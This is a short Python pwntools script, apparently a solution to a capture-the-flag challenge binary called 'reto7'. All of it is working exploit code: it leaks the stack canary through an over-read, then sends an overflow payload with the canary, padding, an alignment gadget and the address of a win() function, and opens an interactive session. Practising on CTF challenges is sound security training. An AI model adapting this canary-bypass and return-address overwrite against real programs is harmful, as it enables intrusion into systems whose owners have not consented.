#!/usr/bin/env python3
from pwn import *

context.terminal = ["x-terminal-emulator", "-e"]
p = process("./reto7")

# leak canary
p.sendlineafter(b"length", b"400")
p.sendlineafter(b"input", b"A")
p.recvuntil(b"was:\n")
leak = p.recv(400)
# print(hexdump(leak))
canary = u64(leak[0x28:0x30])
print(f"canary: {canary:#x}")

# do rop
# attach(p, "break *0x00000000004012f0\ncontinue")
payload = b"A"*40
payload += p64(canary)
payload += p64(0) # padding
payload += p64(0x4012f0) # ret for stack alignment
payload += p64(0x401216) # win()
p.sendlineafter(b"length", b"400")
p.sendlineafter(b"input", payload)

p.interactive()
